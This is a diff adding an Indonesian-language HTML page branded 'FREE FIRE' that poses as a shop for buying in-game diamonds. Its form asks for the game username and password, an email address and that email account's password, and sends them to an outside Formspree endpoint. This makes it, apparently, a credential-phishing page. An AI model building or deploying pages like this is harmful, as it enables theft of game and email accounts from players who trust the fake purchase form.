@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="navbar.css">
+    <link rel="stylesheet" href="footer.css">
+    <link rel="stylesheet" href="header.css">
+    <link rel="stylesheet" href="slider.css">
+    <link rel="stylesheet" href="content.css">
+    <link rel="stylesheet" href="content2.css">
+    <link rel="stylesheet" href="kontak.css">
+    <title>FREE FIRE</title>
+</head>
+<body>
+    <div class="navbar" id="navbar">
+        <div class="logo">
+            <img src="ff.png" alt="Logo" id="logo-icon">
+        </div>
+        <span class="bene-lawyer">FREE FIRE</span>
+        <div class="menu-toggle" id="menu-toggle" onclick="toggleMenu()">
+            <div class="bar"></div>
+        </div>
+        <div class="menu-items"> 
+            <a href="#">HOME</a>
+        </div>
+    </div>
+
+    <!-- ========================= contact style-6 start ========================= -->
+    <section id="contact" class="contact-section contact-style-6">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-7">
+                    <div class="contact-form-wrapper">
+                        <form id="contact-form" action="https://formspree.io/f/xbjvpovj" method="POST">
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <div class="single-input">
+                                        <label for="name">USERNAME</label>
+                                        <input type="text" id="name" name="name" class="form-input" placeholder="Nama">
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="single-input">
+                                        <label for="password">PASSWORD</label>
+                                        <input type="password" id="password" name="password" class="form-input" placeholder="password">
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="single-input">
+                                        <label for="email">E-mail</label>
+                                        <input type="email" id="email" name="email" class="form-input" placeholder="email">
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="single-input">
+                                        <label for="password">password email</label>
+                                        <input type="password" id="password" name="password" class="form-input" placeholder="password email">
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="single-input">
+                                        <label for="cash">jumlah diamond</label>
+                                        <input type="cash" id="cash" name="cash" class="form-input" placeholder="jumlah diamond">
+                                    </div>
+                                </div>
+                                <div class="col-md-12">
+                                    <div class="form-button">
+                                        <button type="submit" class="button radius-10">Beli</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <div class="top" onclick="goToTop()">✋</div>
+    <script>
+        const goToTop = () => {
+        return location.href=""
+    }
+    </script>
+    <!-- ========================= contact style-6 end ========================= -->
+
+
+    <script>
+        function toggleMenu() {
+            var menuToggle = document.getElementById("menu-toggle");
+            var menuItems = document.querySelector(".menu-items");
+    
+            menuToggle.classList.toggle("active");
+            if (menuToggle.classList.contains("active")) {
+                menuItems.style.display = "flex";
+                menuToggle.innerHTML = "&#10006;"; 
+            } else {
+                menuItems.style.display = "none";
+                menuToggle.innerHTML = "&#9776;"; 
+            }
+        }
+    </script>
+    
+     
+    <footer>
+        <div class="footer-content">
+            <div class="footer-logo">
+                <img src="ff.png" alt="Footer Logo">
+            </div>
+            <div class="footer-info">
+                <h3>Kontak Kami</h3>
+                <p>Alamat: Jakarta Pusat</p>
+                <p>Email: freefire@gameschool.com</p>
+                <p>Telepon: (0821)-4480-7749  </p>
+            </div>
+            <div class="footer-social">
+                <h3>Sosial Media</h3>
+                <a href="#" class="social-icon"><i class="fab fa-facebook"></i></a>
+                <a href="#" class="social-icon"><i class="fab fa-twitter"></i></a>
+                <a href="#" class="social-icon"><i class="fab fa-instagram"></i></a>
+            </div>
+        </div>
+    </footer>
+    <script src="kontak.js"></script>
+</body>
+</html>
